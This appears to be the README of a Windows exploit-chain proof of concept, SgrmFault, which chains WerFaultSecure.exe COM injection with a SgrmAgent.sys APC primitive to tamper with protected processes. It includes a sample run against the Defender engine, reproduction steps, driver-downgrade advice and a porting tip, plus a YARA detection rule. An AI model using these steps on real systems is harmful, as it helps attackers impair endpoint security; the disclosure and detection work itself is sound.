# SgrmFault - Chaining Trusted Windows Components into a Process-Tampering Primitive
SgrmFault is a Windows process-tampering exploit chain that combines a revived COM-based code-injection technique in WerFaultSecure.exe with an APC-based process-tampering primitive exposed by Microsoft’s SgrmAgent.sys driver.

This research was presented at **REcon 2026** and **DEF CON 34** under the title

> **Chaining Microsoft Binaries to get Privileged Primitives in the Windows Kernel**

This Proof-of-Concept code demonstrates the complete chain.

```
C:\Users\test\Desktop>SgrmFault.exe -p 2640 -t "MsMpEng.exe"
*******************************************************************************
*       SgrmFault: WerFaultSecure & SgrmAgent.sys Process Impairment Chain
*       Exploit chain presented at REcon 2026 & DEF CON 34
*       GitHub: https://www.github.com/lem0nSec/SgrmFault
*       Angelo Frasca Caccia (lem0nSec_) & Alejandro Pinna
*******************************************************************************

[+] SeDebugPrivilege ok
[+] SGRM Shellcode of size 1792 ready at 0x000001EC54D6EE10
[+] Section object created: 0x1e0
[+] Section mapped in local process: 0x000001EC56740000
[+] Random GUID generated: e19a2416-9303-4970-a216-6a1f58928c79
[+] Opened inheritable handle to AppContainer process: 0x1ec
[+] Section object is now inheritable.
[+] Spawned WerFaultSecure: 7676 - Waiting for overlapped result...
[+] Oplock fired! Dumping WerFaultSecure.exe...
[+] IRundown parameters collected.
[+] Remote section identified at 0x000001E6D6A40000
[+] IRundown connection successful: 0x000001EC569D2F08
[+] DoCallback 1.
[+] Sample _CONTEXT saved:
        RIP: 0x00007FFDA552540E
        RSP: 0x000000E0EB1FE190
        RBP: 0x000000E0EB1FE1F0
[+] DoCallback 2. Firing shellcode & waiting...
[+] Complete.
```

## Requirements
**This POC runs under the following requirements:**
- Windows 10 or 11 up to 22H2 with System Guard Runtime Monitor installed and running
- `SgrmAgent.sys` version 10.0.20348.2849 or lower

Windows 11 comes with SGRM up to 22H2, though the driver is not exploitable, but still downgradable to an older version like the one in `bins`.

## How to reproduce
**Make sure you follow these steps:**
1) Make sure the requirements above are met;
2) Bring `bins/WerFaultSecure.exe` and `bins/faultrep.dll` to the same path (optionally replace `C:\Windows\System32\drivers\SgrmAgent.sys` on your target machine with `bins\SgrmAgent.sys` if non-exploitable);
3) Start an AppContainer process (calc.exe);
4) Run `SgrmFault.exe`, and pass it the AppContainer process ID and the name of the target process.


## Compatibility Notes
While this exploit chain specifically **targets Windows 11 22H2 and below**, because SGRM was deprecated in 2025 and not available on newer OS builds. That said, the PPL injection portion of this exploit can be ported to 25H2 with the following modification.

- Windows 24H2+ requires adding the field `DWORD flags` to the struct `IPIDEntry` as specified in `com.h:49`;

## Detection
This is a basic Yara rule to detect the compiled SgrmFault.exe binary.

```yara
rule SgrmFault_detect {
    meta:
        author = "Angelo Frasca Caccia"
        description = "Detects the SgrmFault binary"
        reference = "https://github.com/lem0nSec/SgrmFault"
        
    strings:
        $import1 = "NtContinue"
        $clsid_twinapi = "{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}" nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $string1 = "SgrmBroker.exe" nocase wide ascii
        
    condition:        
        (uint16(0) == 0x5A4D) and $import1 and $clsid_twinapi and $meow_header and $string1
}
```

## Authors
* [Angelo Frasca Caccia](https://linkedin.com/in/angelo-frasca-caccia)
* [Alejandro Pinna](https://x.com/frodosobon)

## Credits
* [@tirannido](https://x.com/tiraniddo)
* [@mdsecactivebreach - com_inject](https://github.com/mdsecactivebreach/com_inject/tree/fe3424ba10bbfe8398b4d68377824dce57e425e1)

## References
- https://projectzero.google/2018/10/injecting-code-into-windows-protected.html
- https://projectzero.google/2018/11/injecting-code-into-windows-protected.html
- https://github.com/tyranid/oleviewdotnet
- https://www.microsoft.com/en-us/security/blog/2018/04/19/introducing-windows-defender-system-guard-runtime-attestation/
